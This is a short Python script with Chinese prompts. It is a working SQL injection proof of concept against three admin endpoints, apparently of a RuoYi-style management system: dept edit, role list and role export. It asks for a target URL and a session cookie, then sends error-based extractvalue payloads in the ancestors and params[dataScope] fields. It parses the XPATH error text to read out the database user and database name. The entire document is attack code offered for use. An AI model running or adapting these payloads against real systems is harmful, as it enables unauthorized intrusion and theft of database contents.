## python脚本
```html
import re
import time
import requests
url=input('请输入url:')#http://127.0.0.1
poc1='/system/dept/edit'
poc2='/system/role/list'
poc3='/system/role/export'
Cookie=input('请输入cookie:') #JSESSIONID=e25dbec9-a469-4f26-9eee-d42fa5bc1658
headers={
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Cookie': Cookie
}
print('尝试第一个payload')
time.sleep(2)
data1="DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#"
data2="params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))"
data3="params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))"
res1=requests.post(url=url+poc1,headers=headers,data=data1,timeout=10)
sql=re.findall("XPATH syntax error: '(.*?)'",res1.text)
print("".join(list(set(sql))))
if sql=='':
    print('无法自动判断是否存在，请手工判断')
    print(res1.text)
print('尝试第二个payload')
time.sleep(2)
res2=requests.post(url=url+poc2,headers=headers,data=data2,timeout=10)
sql1=re.findall("~(.*?)~",res2.text)
print("".join(list(set(sql1))))
if sql1=='':
    print('无法自动判断是否存在，请手工判断')
    print(res2.text)
print('尝试第三个payload')
time.sleep(2)
res3=requests.post(url=url+poc3,headers=headers,data=data3,timeout=10)
sql2=re.findall("~(.*?)~",res3.text)
print("".join(list(set(sql2))))
if sql2=='':
    print('无法自动判断是否存在，请手工判断')
    print(res3.text)
```
